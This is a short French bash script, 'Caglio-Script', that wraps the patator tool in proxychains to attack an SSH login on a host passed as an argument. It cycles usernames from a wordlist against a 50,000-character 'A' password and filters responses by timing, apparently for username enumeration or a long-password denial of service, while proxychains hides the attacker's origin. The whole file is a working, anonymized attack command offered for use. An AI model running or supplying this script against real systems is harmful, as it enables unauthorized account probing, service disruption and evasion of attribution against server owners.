#!/bin/bash
# -*- coding: utf8 

chemin_vers_patator="*à renseigné *"
chemin_vers_dico="*à renseigné *"

if [ $# = 0 ]                                       
then
    echo "..Aucune cible spécifié. ."
elif [ $1 = -h ]
then
    echo " Utilisation du patator chainé avec un proxy "
    exit
else
    echo "******* Caglio-Script ********"
    echo " patator ssh/ proxychains     "

proxychains python $chemin_vers_patator ssh_login host=$1 user=FILE0 0=$chemin_vers_dico password=$(perl -e "print 'A'x50000") --max-retries 0 --timeout 10 -x ignore:time=0-3

fi


